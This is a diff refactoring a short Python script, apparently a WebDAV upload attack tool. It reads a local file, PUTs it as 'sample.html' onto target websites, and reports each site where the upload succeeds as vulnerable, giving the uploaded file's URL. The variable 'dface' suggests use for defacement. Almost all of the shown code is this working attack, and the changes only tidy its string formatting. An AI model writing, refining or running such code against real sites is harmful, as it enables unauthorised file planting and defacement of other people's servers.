@@ -10,7 +10,7 @@ except ImportError:
 
 
 def aox(script, site):
-   dface = "/"+script
+   dface = f"/{script}"
 
    op = open(script,"r").read()
 
@@ -19,16 +19,18 @@ def aox(script, site):
    try:
       site = site.strip()
       if site.startswith("http://") is False:
-         site = "http://" + site
+         site = f"http://{site}"
 
-      req = s.put(site+"/"+"sample.html", data=op)
+      req = s.put(f"{site}/sample.html", data=op)
 
       print(f"[+] Checking {site}")
       if req.status_code < 200 or req.status_code >= 250:
-        print("[-] The website is not vulnerable to WebDAV File upload !")
+         print("[-] The website is not vulnerable to WebDAV File upload !")
       else:
-        invisible = site + "/sample.html"
-        print("[+] The website is vulnerable to WebDAV File upload !\n\n[!] site with uploaded file : {}".format(invisible))
+         invisible = f"{site}/sample.html"
+         print(
+             f"[+] The website is vulnerable to WebDAV File upload !\n\n[!] site with uploaded file : {invisible}"
+         )
    except requests.exceptions.RequestException:
        print("some error!!")
 
